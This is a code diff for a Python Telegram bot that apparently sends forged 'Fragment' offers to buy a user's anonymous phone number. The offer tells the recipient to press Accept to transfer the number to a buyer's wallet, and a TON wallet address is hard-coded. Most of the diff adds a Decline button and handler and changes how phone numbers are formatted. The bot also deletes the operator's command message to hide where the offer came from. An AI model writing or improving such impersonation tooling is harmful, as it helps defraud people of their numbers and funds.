@@ -11,7 +11,9 @@ TON_WALLET = "UQCiU6HfycyDIneKsw-UAYakjfr4W99W558nbJKaaRPeSh6b"
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dispatcher = Dispatcher()
 
+# ID премиум-эмодзи
 CHECK_EMOJI_ID = "5774022692642492953"
+CROSS_EMOJI_ID = "5778527486270770928"
 ENVELOPE_EMOJI_ID = "6019263620142078168"
 
 async def safe_delete(chat_id, message_id, conn_id=None):
@@ -56,7 +58,7 @@ async def send_offer(message: Message):
     try:
         amount = parts[2] if not parts[2].startswith("+") else parts[3]
         if len(amount) > 6:
-            await bot.send_message(message.chat.id, "❌ Ошибка формата. Вводите так: <code>.gpt +8880367 150</code>", parse_mode="HTML")
+            await bot.send_message(message.chat.id, "❌ Ошибка формата. Вводите так: <code>.gpt +88803674195 150</code>", parse_mode="HTML")
             return
     except IndexError:
         return
@@ -65,16 +67,13 @@ async def send_offer(message: Message):
 
     phone_clean = phone_number.replace("+", "")
     if len(phone_clean) >= 10:
-        formatted_phone = f"+{phone_clean[:3]} {phone_clean[3:]}"
+        formatted_phone = f"+{phone_clean[:3]} {phone_clean[3:7]} {phone_clean[7:]}"
     else:
         formatted_phone = phone_number
 
-    # Ссылка на страницу номера на Fragment (для превью картинки)
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
-    # Текст оффера (как на скрине)
     offer_text = (
-        f"<b>Fragment Auctions</b>\n"
         f"<b>Buy {formatted_phone}</b>\n\n"
         f"Поступило предложение о выкупе вашего анонимного номера.\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
@@ -82,14 +81,15 @@ async def send_offer(message: Message):
         f"<i>Нажмите «Принять» для перевода номера на кошелек покупателя.</i>"
     )
 
+    # ДОБАВЛЕНА КНОПКА ОТКЛОНИТЬ
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(text="Отклонить", callback_data="decline_offer", icon_custom_emoji_id=CROSS_EMOJI_ID),
         InlineKeyboardButton(text="Принять", callback_data="accept_offer", icon_custom_emoji_id=CHECK_EMOJI_ID)
     ]])
 
     await safe_delete(message.chat.id, message.message_id, message.business_connection_id)
 
     try:
-        # Отправляем сообщение с принудительным превью
         await bot.send_message(
             chat_id=message.chat.id,
             text=offer_text,
@@ -132,6 +132,15 @@ async def on_accept_offer(callback: CallbackQuery):
         print(f"Ошибка: {e}")
         
     await callback.answer()
+
+# --- ОБРАБОТЧИК ОТКЛОНЕНИЯ ---
+@dispatcher.callback_query(F.data == "decline_offer")
+async def on_decline(callback: CallbackQuery):
+    try:
+        await callback.message.delete()
+    except Exception as e:
+        print(f"Ошибка удаления: {e}")
+    await callback.answer("Вы отклонили предложение.", show_alert=True)
 
 @dispatcher.callback_query(F.data == "copy_wallet")
 async def on_copy_wallet(callback: CallbackQuery):
